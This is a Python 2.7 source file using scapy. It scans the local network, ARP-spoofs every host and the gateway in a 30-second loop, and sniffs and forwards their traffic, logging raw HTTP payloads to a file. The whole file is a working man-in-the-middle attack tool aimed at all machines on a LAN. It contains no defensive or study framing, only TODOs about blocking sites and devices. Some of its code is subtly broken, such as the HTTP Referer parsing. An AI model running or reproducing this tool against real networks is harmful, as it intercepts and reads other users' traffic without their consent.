#python 2.7


import logging
from threading import Thread,Lock
from time import sleep
from scapy.all import *
from datetime import datetime
import functions
#from scapy.layers import HTTP


# except ImportError:
#
#     #TODO: handle all cases of missing modules and try to solve
#     print 'a module is missing please check you have all required modules'

# global variables:
localAddresses=[]
addressesLock=Lock()
gatewayMAC=''

def handle_Packet(pkt):
    """
    add sniffed packets to queue of prescanned packets
    if packet is an ARP packet check if new device needs to be added to list
    send it forward
    """

    if ARP not in pkt:
        #print pkt.show()
        #TODO: implement computer block list
        functions.sendPacket(pkt,gatewayMAC)
        try:
            if 80 == pkt[TCP].dport:
                #TODO: get http query and block a site
                logging.info(pkt[Raw].decode('hex'))
                print 'http packet:',pkt[Raw],pkt[Raw].decode('hex').split['Referer'][1].split['\\r\\n'][0]

        except Exception as exc:
            logging.critical(exc)

    else:
        if pkt[ARP].op == 2: #check if ARP operation is: is-at

            address=pkt[ARP].psrc #extract IP address
            addressesLock.acquire()
            global localAddresses
            if address not in localAddresses: #check for duplicates
                localAddresses.append(address) #add IP address to list of all hosts
                print 'added',address
            addressesLock.release()



def arpSpoof(router,localHost):
    """
    every 30 seconds send ARP broadcast to spoof all machines on LAN
    """

    while True:
        if len(localAddresses)>0:
            addressesLock.acquire()
            print 'spoofing',str(len(localAddresses))
            for host in localAddresses:
                if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them

                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#creante arp packets
                    gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
                    logging.debug('spoofing: '+victimPacket[ARP].pdst)
                    sendp(victimPacket)#send packets
                    sendp(gatewayPacket)

            addressesLock.release()
            sleep(30)




def setup():
    """
    get all necessary values for the program to run
    and start all threads
    """
    #get default gateway, local IP address and local MAC address
    global gatewayMAC
    defaultGateway,localHost,gatewayMAC=functions.getLocalhostAddress()
    print defaultGateway,gatewayMAC,localHost
    logging.debug('got default gateway and local IP and MAC')

    global localAddresses
    localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
    logging.debug('scanned network for all active hosts')
    print localAddresses

    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
    logging.debug('created thread for ARP spoofing')
    arpThread.start()
    logging.debug('spoofing all hosts on network')




def main():
    """
    control the whole program
    gets the parameters for working
    then calls all functions in order
    """
    #setup logging to file logFile.log
    logging.basicConfig(filename='logFile.log',level=logging.INFO, format='%(lineno)s - %(levelname)s : %(message)s')
    logging.info('\n\n\n\n\n########## Program Start ##########\n\n')

    setup() #get all required variables and start all threads
    logging.info('setup complete')


    sniff(prn=handle_Packet)

    while True:
        pass
    #TODO: add function to scan packets and update information about each device



if __name__=='__main__':
    main()
